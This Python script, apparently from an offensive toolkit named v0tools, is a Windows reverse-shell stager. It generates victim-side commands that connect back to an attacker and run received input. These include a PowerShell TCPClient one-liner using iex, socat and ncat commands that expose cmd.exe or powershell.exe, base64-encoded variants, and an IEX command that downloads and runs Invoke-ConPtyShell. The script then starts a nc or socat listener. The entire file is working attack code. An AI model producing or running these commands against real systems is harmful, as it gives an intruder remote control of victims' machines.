#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Windows Reverse Shell stager."""
import argparse
from v0tools.lib import util
from v0tools import ansi, net, fzfhelper, syspkgs
from v0tools.lib.util import powershell_base64_encode
from pyfzf.pyfzf import FzfPrompt
from v0tools.servers import httpserv
from v0tools import Config, cli
import os
import time

SAVE = r"""
New-Object System.Net.Sockets.TCPClient('__IP__',__PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""

PSCMDS = r"""
$client = New-Object System.Net.Sockets.TCPClient('__IP__',__PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
"""


def _rawshell(args):
    """Raw Cons shell listener

    Runs: stty raw -echo; (stty size; cat) | nc -lvnp {args.port}
    """
    rows, cols = util.term_rows_cols()
    file = Config.V0_POWERSHELL_CONPTY()
    # Random port for temporary serv
    port = util.randport()
    psurl = httpserv.powershell_serv(args.address, str(port), file)
    pscmd = f"IEX({psurl}); Invoke-ConPtyShell -RemoteIp {args.address} -RemotePort {args.port} -Rows {rows} -Cols {cols}"
    remote_commands = [
        f"powershell -nop -c {pscmd}",
        f"powershell -nop -e {powershell_base64_encode(pscmd)}",
    ]
    lcmd = f"stty raw -echo; (stty size; cat) | nc -lvnp {args.port}"
    _print_remote(remote_commands)
    _print_local(lcmd)
    # small delay to allow the above stuff to finish before the raw terminal
    # makes stuff look wonky
    time.sleep(2)
    os.system(lcmd)
    # Reset the tty
    os.system("stty sane")


def _powershell(args):
    """Powershell reverse shell listener

    Runs: rlwrap socat tcp-listen:"{args.port}" STDOUT
    """

    def _repl(src, address, port):
        return src.strip().replace("__IP__", address).replace("__PORT__", str(port))

    pscmds = [
        _repl(i, args.address, args.port) for i in PSCMDS.splitlines() if i.strip()
    ]

    remote_commands = [
        f"socat TCP4:{args.address}:{args.port} EXEC:'cmd.exe',pipes",
        f"socat TCP4:{args.address}:{args.port} EXEC:'powershell.exe',pipes",
        f"ncat.exe {args.address} {args.port} -e powershell.exe",
        f"ncat.exe {args.address} {args.port} -e cmd.exe",
    ]

    for i in pscmds:
        remote_commands.append(f'powershell -nop -c "{i}"')
        remote_commands.append(f"powershell -nop -e {powershell_base64_encode(i)}")

    lcmd = f'rlwrap socat tcp-listen:"{args.port}" STDOUT'
    _print_remote(remote_commands)
    _print_local(lcmd)
    os.system(lcmd)


SH_MAP = {
    "psh": _powershell,
    "conpty": _rawshell,
}

cli = cli.Cli()
cli.add_port()
cli.add_ipv_interface()
parser = cli.parser

parser.add_argument(
    "--rshell",
    "-s",
    help=f"Reverse shell type {','.join(SH_MAP.keys())}",
    type=str,
)

parser.add_argument(
    "--list",
    "-l",
    help="List reverse shell types",
    action="store_true",
    default=False,
)


def _print_remote(remote_commands):
    print(ansi.banner("Victim Commands:"))
    for i in remote_commands:
        print(f"{i}\n")


def _print_local(lcmd):
    print(ansi.banner(f"Starting listener: {lcmd}"))


def main(args):
    """Run main function."""
    SH_MAP[args.rshell](args)


if __name__ == "__main__":
    syspkgs.check_installs(["nc", "socat", "rlwrap"])
    args = cli.get_parse()
    # args = parser.parse_args(["-l"])
    # args = parser.parse_args(["-i", "tun0", "-p", "36185"])
    # args = parser.parse_args(["-i", "tun0"])
    if args.list:
        for k, func in SH_MAP.items():
            print(f"{k}:")
            for line in func.__doc__.split("\n"):
                print(f"\t{line.strip()}")
        raise SystemExit()
    args.rstr = util.randstr()
    args.fzf = FzfPrompt()
    if not args.rshell:
        if len(SH_MAP) == 1:
            args.rshell = list(SH_MAP.keys())[0]
        else:
            args.rshell = args.fzf.prompt(SH_MAP.keys())[0]
    main(args)
